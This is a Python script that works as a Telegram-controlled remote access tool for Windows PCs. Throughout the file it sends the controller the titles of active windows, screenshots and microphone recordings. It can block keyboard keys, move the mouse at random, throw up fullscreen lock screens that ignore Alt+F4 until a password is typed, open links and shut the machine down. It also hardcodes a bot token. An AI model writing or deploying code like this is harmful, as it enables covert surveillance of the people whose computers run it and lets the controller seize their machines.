import os
import asyncio
import mss
import tkinter as tk
from tkinter import messagebox
import keyboard
import pyautogui
import sounddevice as sd
from scipy.io import wavfile
import random
import webbrowser
import socket
import pygetwindow as gw
import winsound
import threading

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.session.aiohttp import AiohttpSession

# --- НАСТРОЙКИ ---
API_TOKEN = '8048641396:AAHeGQOqfdAWLl3BFmwgp71Vnn4ggkX4Xik'
ADMIN_ID = 790289059 
LOCK_PASSWORD = "1234"

pyautogui.FAILSAFE = False
session = AiohttpSession()
bot = Bot(token=API_TOKEN, session=session)
dp = Dispatcher()

# Состояния
keys_blocked = False
mouse_chaos_active = False
last_window = ""
blocked_list = ['windows', 'alt', 'tab', 'esc', 'ctrl', 'shift', 'menu']

# --- 1. МОНИТОРИНГ ---
async def monitor_active_window():
    global last_window
    while True:
        try:
            win = gw.getActiveWindow()
            if win and win.title and win.title != last_window:
                last_window = win.title
                await bot.send_message(ADMIN_ID, f"🖥 <b>Окно:</b> <code>{last_window}</code>", parse_mode="HTML")
        except: pass
        await asyncio.sleep(5)

# --- 2. УПРАВЛЕНИЕ ---
async def chaotic_mouse_loop():
    sw, sh = pyautogui.size()
    while mouse_chaos_active:
        try:
            pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.1)
        except: pass
        await asyncio.sleep(0.05)

def toggle_keys():
    global keys_blocked
    try:
        if not keys_blocked:
            for k in blocked_list:
                try: keyboard.block_key(k)
                except: pass
            keys_blocked = True
            return "🚫 Клавиатура ЗАБЛОКИРОВАНА"
        else:
            keyboard.unhook_all()
            keys_blocked = False
            return "✅ Клавиатура РАЗБЛОКИРОВАНА"
    except Exception as e:
        return f"❌ Ошибка блокировки: {e}"

# --- 3. ЭКРАН: МАТРИЦА ---
def show_matrix_lock():
    keyboard.unhook_all()
    root = tk.Tk()
    root.attributes("-topmost", True, "-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None) # Запрет Alt+F4
    root.configure(bg='black')
    root.config(cursor="none")
    
    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    canvas = tk.Canvas(root, bg='black', highlightthickness=0)
    canvas.pack(fill="both", expand=True)
    root.grab_set() # Блокировка фокуса

    chars = "0123456789ABCDEF"
    font_size = 18
    columns = sw // font_size
    drops = [random.randint(-sh//font_size, 0) for _ in range(columns)]
    
    # Поле ввода
    pwd_entry = tk.Entry(root, show="*", font=("Arial", 20), justify='center', bg="#050505", fg="#00ff41", insertbackground="#00ff41")
    canvas.create_window(sw//2, sh//2 + 50, window=pwd_entry, width=250)
    
    canvas.create_text(sw//2, sh//2 - 50, text="SYSTEM LOCKED", fill="red", font=("Courier New", 40, "bold"))

    def draw_matrix():
        canvas.delete("matrix_char") # Удаляем только старые символы
        for i in range(len(drops)):
            char = random.choice(chars)
            canvas.create_text(i*font_size, drops[i]*font_size, text=char, fill="#00ff41", font=("Courier New", font_size), tags="matrix_char")
            if drops[i]*font_size > sh and random.random() > 0.975: drops[i] = 0
            drops[i] += 1
        root.after(60, draw_matrix)

    pwd_entry.focus_force()
    pwd_entry.bind('<Return>', lambda e: root.destroy() if pwd_entry.get() == LOCK_PASSWORD else pwd_entry.delete(0, tk.END))
    draw_matrix()
    root.mainloop()

# --- 4. ЭКРАН: ПРАЗДНИК ---
def show_new_year_lock():
    keyboard.unhook_all()
    root = tk.Tk()
    root.attributes("-topmost", True, "-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None) # Запрет Alt+F4
    root.configure(bg='#000510')
    root.config(cursor="none")

    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    canvas = tk.Canvas(root, bg='#000510', highlightthickness=0)
    canvas.pack(fill="both", expand=True)
    root.grab_set()

    # Елка
    canvas.create_rectangle(sw//2-20, sh-180, sw//2+20, sh-120, fill="#3d1f00")
    canvas.create_polygon(sw//2, sh-550, sw//2-150, sh-350, sw//2+150, sh-350, fill="#004d00")
    canvas.create_polygon(sw//2, sh-450, sw//2-180, sh-250, sw//2+180, sh-250, fill="#005a00")
    canvas.create_polygon(sw//2, sh-350, sw//2-210, sh-150, sw//2+210, sh-150, fill="#006400")
    canvas.create_text(sw//2, sh-560, text="⭐", font=("Arial", 45), fill="gold")

    lights = [canvas.create_oval(0,0,0,0) for _ in range(30)]
    def blink():
        for l in lights:
            lx, ly = random.randint(sw//2-180, sw//2+180), random.randint(sh-500, sh-180)
            canvas.coords(l, lx, ly, lx+10, ly+10)
            canvas.itemconfig(l, fill=random.choice(["red", "yellow", "cyan", "white", "blue"]), outline="")
        root.after(400, blink)

    def firework():
        fx, fy = random.randint(100, sw-100), random.randint(100, sh-400)
        color = random.choice(["#ff0044", "#00ff00", "#ffffff"])
        parts = [canvas.create_oval(fx, fy, fx+5, fy+5, fill=color, outline="") for _ in range(12)]
        dirs = [(random.uniform(-7, 7), random.uniform(-7, 7)) for _ in parts]
        def anim(step=20):
            if step > 0:
                for i, p in enumerate(parts): canvas.move(p, dirs[i][0], dirs[i][1])
                root.after(50, lambda: anim(step-1))
            else: [canvas.delete(p) for p in parts]
        anim(); root.after(1000, firework)

    canvas.create_text(sw//2, 120, text="С НОВЫМ ГОДОМ 2026!", font=("Courier New", 50, "bold"), fill="white")
    pwd_entry = tk.Entry(root, show="*", font=("Arial", 25), justify='center', bg="#111", fg="white", insertbackground="white")
    canvas.create_window(sw//2, sh-60, window=pwd_entry, width=250)
    pwd_entry.bind('<Return>', lambda e: root.destroy() if pwd_entry.get() == LOCK_PASSWORD else pwd_entry.delete(0, tk.END))
    pwd_entry.focus_force()
    blink(); firework(); root.mainloop()

# --- 5. TELEGRAM ЛОГИКА ---
def get_keyboard():
    l_txt = "🔓 Разблок" if keys_blocked else "🔒 Блок клавы"
    m_txt = "🖱 Стоп мышь" if mouse_chaos_active else "🖱 Хаос мыши"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Скриншот", callback_data="screenshot"), InlineKeyboardButton(text="❌ Close Win", callback_data="close")],
        [InlineKeyboardButton(text=l_txt, callback_data="toggle_k"), InlineKeyboardButton(text=m_txt, callback_data="toggle_m")],
        [InlineKeyboardButton(text="🔒 Матрица", callback_data="lock_m"), InlineKeyboardButton(text="🎄 Праздник", callback_data="lock_ny")],
        [InlineKeyboardButton(text="🔇 Mute", callback_data="mute"), InlineKeyboardButton(text="🎙 Запись", callback_data="rec")],
        [InlineKeyboardButton(text="🔌 Off PC", callback_data="off")]
    ])

@dp.callback_query()
async def handle_call(call: types.CallbackQuery):
    global mouse_chaos_active
    if call.from_user.id != ADMIN_ID: return
    try:
        data = call.data
        if data == "screenshot":
            with mss.mss() as sct:
                sct.shot(output="s.png")
                await bot.send_photo(ADMIN_ID, types.FSInputFile("s.png"))
                os.remove("s.png")
        elif data == "close": 
            pyautogui.hotkey('alt', 'f4')
        elif data == "toggle_k":
            res = toggle_keys()
            await bot.send_message(ADMIN_ID, res)
            await call.message.edit_reply_markup(reply_markup=get_keyboard())
        elif data == "toggle_m":
            mouse_chaos_active = not mouse_chaos_active
            if mouse_chaos_active: asyncio.create_task(chaotic_mouse_loop())
            await call.message.edit_reply_markup(reply_markup=get_keyboard())
        elif data == "lock_m": threading.Thread(target=show_matrix_lock, daemon=True).start()
        elif data == "lock_ny": threading.Thread(target=show_new_year_lock, daemon=True).start()
        elif data == "mute": 
            pyautogui.press('volumemute')
            await bot.send_message(ADMIN_ID, "🔇 Состояние звука изменено")
        elif data == "rec":
            await bot.send_message(ADMIN_ID, "🎙 Записываю 10с...")
            fs = 44100
            rec = sd.rec(int(10 * fs), samplerate=fs, channels=2)
            sd.wait()
            wavfile.write("r.wav", fs, rec)
            await bot.send_voice(ADMIN_ID, types.FSInputFile("r.wav"))
            os.remove("r.wav")
        elif data == "off": os.system("shutdown /s /t 0")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")
    await call.answer()

@dp.message(F.text)
async def handle_text(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    if message.text.startswith("http"):
        webbrowser.open(message.text)
        await message.reply("🌐 Ссылка открыта")
    else:
        text = message.text
        def show_topmost_msg():
            # Создаем невидимое окно для управления приоритетом
            temp_root = tk.Tk()
            temp_root.withdraw() # Прячем само окно
            temp_root.attributes("-topmost", True) # Ставим поверх всех
            messagebox.showinfo("Admin Message", text, parent=temp_root)
            temp_root.destroy()

        threading.Thread(target=show_topmost_msg, daemon=True).start()
        await message.reply("⚠️ Сообщение отправлено на передний план")

async def main():
    asyncio.create_task(monitor_active_window())
    await bot.send_message(ADMIN_ID, "🚀 <b>Бот готов. Все системы стабильны.</b>", reply_markup=get_keyboard(), parse_mode="HTML")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"Критическая ошибка запуска: {e}")
